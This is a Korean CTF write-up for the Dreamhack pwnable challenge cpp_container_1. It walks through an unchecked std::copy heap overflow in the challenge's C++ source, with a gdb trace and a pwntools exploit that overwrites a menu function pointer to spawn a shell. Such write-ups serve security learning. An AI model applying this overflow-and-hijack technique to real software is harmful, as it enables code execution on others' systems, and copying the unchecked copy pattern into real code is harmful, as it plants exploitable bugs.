---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN cpp_container_1"
excerpt: "드림핵 포너블 cpp_container_1 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-03-23 18:00
---

level3 문제이다. 난이도가 있을 줄 알고 이것저것 삽질을 좀 했는데 생각보다 어이없게 풀린 문제다. 우선 C++의 vactor 컨테이너에서 발생하는 메모리 커럽션을 이용해 문제를 풀어야 한다.

우선 소스코드를 먼저 살펴보자.

```c++
// g++ -o pwn-container-overflow-1 pwn-container-overflow-1.cpp -no-pie

#include <iostream>
#include <vector>
#include <cstdlib>
#include <csignal>
#include <unistd.h>
#include <cstdio>

void alarm_handler(int trash)
{
    std::cout << "TIME OUT" << std::endl;
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void print_menu(){
	std::cout << "container system!" << std::endl;
	std::cout << "1. make container" << std::endl;
	std::cout << "2. modify container" << std::endl;
	std::cout << "3. copy container" << std::endl;
	std::cout << "4. view container" << std::endl;
	std::cout << "5. exit system" << std::endl;
	std::cout << "[*] select menu: ";
}

class Menu{
public:
	Menu(){
	}
	Menu(const Menu&){
	}
	void (*fp)(void) = print_menu;
};


void getshell(){
	system("/bin/sh");
}

void make_container(std::vector<int> &src, std::vector<int> &dest){
	std::cout << "Input container1 data" << std::endl;
	int data = 0;
	for(std::vector<int>::iterator iter = src.begin(); iter != src.end(); iter++){
		std::cout << "input: ";
		std::cin >> data;
		*iter = data;
	}
	std::cout << std::endl;

	std::cout << "Input container2 data" << std::endl;
	for(std::vector<int>::iterator iter = dest.begin(); iter != dest.end(); iter++){
		std::cout << "input: ";
		std::cin >> data;
		*iter = data;
	}
	std::cout << std::endl;
}

void modify_container(std::vector<int> &src, std::vector<int> &dest){
	int size = 0;

	std::cout << "Input container1 size" << std::endl;
	std::cin >> size;
	src.resize(size);

	std::cout << "Input container2 size" << std::endl;
	std::cin >> size;
	dest.resize(size);
}

void copy_container(std::vector<int> &src, std::vector<int> &dest){
	std::copy(src.begin(), src.end(), dest.begin());
	std::cout << "copy complete!" << std::endl;
}

void view_container(std::vector<int> &src, std::vector<int> &dest){
	std::cout << "container1 data: [";
	for(std::vector<int>::iterator iter = src.begin(); iter != src.end(); iter++){
		std::cout << *iter << ", ";
	}
	std::cout << "]" << "\n" << std::endl;

	std::cout << "container2 data: [";
	for(std::vector<int>::iterator iter = dest.begin(); iter != dest.end(); iter++){
		std::cout << *iter << ", ";
	}
	std::cout << "]" << "\n" << std::endl;
}


int main(){
	initialize();
	std::vector<int> src(3, 0);
	std::vector<int> dest(3, 0);
	Menu *menu = new Menu();
	int selector = 0;
	
	while(1){
		menu->fp();
		std::cin >> selector;
		switch(selector){
			case 1:
				make_container(src, dest);
				break;
			case 2:
				modify_container(src, dest);
				break;
			case 3:
				copy_container(src, dest);
				break;
			case 4:
				view_container(src, dest);
				break;
			case 5:
				return 0;
				break;
			default:
				break;
		}
	}
}
```

코드를 살펴보면 4가지 기능이 있다. 1번은 설정된 길이만큼 데이터를 입력 받는다. 2번으로 컨테이너 사이즈를 변경한다. 3번을 통해서 1번 컨테이너 값을 2번 컨테이너로 복사한다. 4번을 통해 컨테이너 내용을 출력한다.

여기서 중점으로 봐야할 부분은 copy_container 부분이다. 컨테이서를 복사하게 되는데 사이즈에 대한 검증이 따로 없는 것을 확인 할 수 있다. 따라서 바이너리를 실행 시키고 1번 컨테이너 크기를 큰 값으로, 2번 컨테이너를 1로 주어 copy를 시도하면 크래쉬가 발생한다.

```
root@9f72a2a108e4:/home# ./cpp_container_1
container system!
1. make container
2. modify container
3. copy container
4. view container
5. exit system
[*] select menu: 2
Input container1 size
100
Input container2 size
1
container system!
1. make container
2. modify container
3. copy container
4. view container
5. exit system
[*] select menu: 3
copy complete!
Segmentation fault (core dumped)
```

Segmentation fault가 발생하는 부분을 gdb를 통해 따라가 보자.

1번 컨테이너 크기는 10, 2번 컨테이너는 1를 주고 3번 메뉴를 통해 copy를 시도한다.
오류가 발생하는 부분은 copy_container 함수가 끝나고 main에서 발생한다. 
```
menu->fp();
 
0040154c 48 8b 45 a8     MOV        RAX,qword ptr [RBP + local_60]
00401550 48 8b 00        MOV        RAX,qword ptr [RAX]
00401553 ff d0           CALL       RAX
```
위 부분에서 문제가 발생하며 어셈블리에는 RAX를 CALL 하는 부분이다. 이 부분에 bp를 걸고 살펴보자.

```
RAX  0x900000009
 RBX  0x2500c60 ◂— 0x900000009 /* '\t' */
 RCX  0x0
 RDX  0x0
 RDI  0x7f7eefa0d620 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RSI  0x7f7eefa0e780 (_IO_stdfile_1_lock) ◂— 0x0
 R8   0x7f7eefa0e780 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7f7ef01c2740 ◂— 0x7f7ef01c2740
 R10  0x1
 R11  0x246
 R12  0x400e00 (_start) ◂— xor ebp, ebp
 R13  0x7ffdd3544370 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffdd3544290 —▸ 0x402b40 (__libc_csu_init) ◂— push r15
 RSP  0x7ffdd3544230 ◂— 0x300000470
*RIP  0x401553 (main+174) ◂— call rax
───────────────[ DISASM / x86-64 / set emulate on ]───────────────
   0x40154c <main+167>    mov    rax, qword ptr [rbp - 0x58]
   0x401550 <main+171>    mov    rax, qword ptr [rax]
 ► 0x401553 <main+174>    call   rax                           <0x900000009>
 
   0x401555 <main+176>    lea    rax, [rbp - 0x5c]
   0x401559 <main+180>    mov    rsi, rax
   0x40155c <main+183>    mov    edi, std::cin@@GLIBCXX_3.4    <0x604100>
   0x401561 <main+188>    call   std::istream::operator>>(int&)@plt                      <std::istream::operator>>(int&)@plt>
 
   0x401566 <main+193>    mov    eax, dword ptr [rbp - 0x5c]
   0x401569 <main+196>    cmp    eax, 5
   0x40156c <main+199>    ja     main+316                      <main+316>
 
   0x40156e <main+201>    mov    eax, eax
───────────────[ STACK ]───────────────
00:0000│ rsp 0x7ffdd3544230 ◂— 0x300000470
01:0008│     0x7ffdd3544238 —▸ 0x2500c60 ◂— 0x900000009 /* '\t' */
02:0010│     0x7ffdd3544240 —▸ 0x2500c80 ◂— 0x900000009 /* '\t' */
03:0018│     0x7ffdd3544248 —▸ 0x2500ca8 ◂— 0x20361
04:0020│     0x7ffdd3544250 —▸ 0x2500ca8 ◂— 0x20361
05:0028│     0x7ffdd3544258 —▸ 0x402b8d (__libc_csu_init+77) ◂— add rbx, 1
06:0030│     0x7ffdd3544260 —▸ 0x2500c40 ◂— 0x900000009 /* '\t' */
07:0038│     0x7ffdd3544268 —▸ 0x2500c44 ◂— 0x900000009 /* '\t' */
───────────────[ BACKTRACE ]───────────────
 ► f 0         0x401553 main+174
   f 1   0x7f7eef668840 __libc_start_main+240
   f 2         0x400e29 _start+41
─────────────────────────────────────────────
```

위 내용을 보면 rax를 call 할때의 rax 값은 0x900000009인 것을 볼 수 있다. 필자가 입력한 9가 들어가 있다. 따라서 힙의 거리를 계산해 해당 힙의 오프셋 만큼 get_shell 주소로 덮으면 쉘을 얻을 수 있을 것 같다.

이 부분이 어떤 값이 원래 있었는지 찾아보니 메뉴를 프린트 해주는 함수 부분이다. 이때 copy를 통해서 heap overflow가 발생하고 print_menu 함수의 주소를 get_shell() 함수 주소로 덮어 뜨면 공격에 성공한다.

오프셋을 계산하면 9만큼 떨어져 있으며 get_shell 함수 주소를 int 형식으로 주었다. 익스플로잇 코드는 다음과 같다.

```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

#p = remote("host3.dreamhack.games", 18225);
#p = process("./iofile_vtable_check", env={'LD_PRELOAD':'./libc.so.6'})
p = process("./cpp_container_1")
elf = ELF("./cpp_container_1")
#libc = ELF("./libc.so.6")

get_shell = 0x401041

p.sendlineafter(b"[*] select menu: ", b"2")

p.sendlineafter(b"Input container1 size\n", b"9")
p.sendlineafter(b"Input container2 size\n", b"1")

p.sendlineafter(b"[*] select menu: ", b"1")
for i in range(1, 11):
    p.sendlineafter(b"input: ", str(get_shell))

p.sendlineafter(b"[*] select menu: ", b"3")

p.interactive()
```

정말 무작정 이것저것 해보다가 답이 없어서 하나하나씩 디버깅 하다가 찾았다. 생각보다 어이없이 풀렸던 재밌는 문제였다.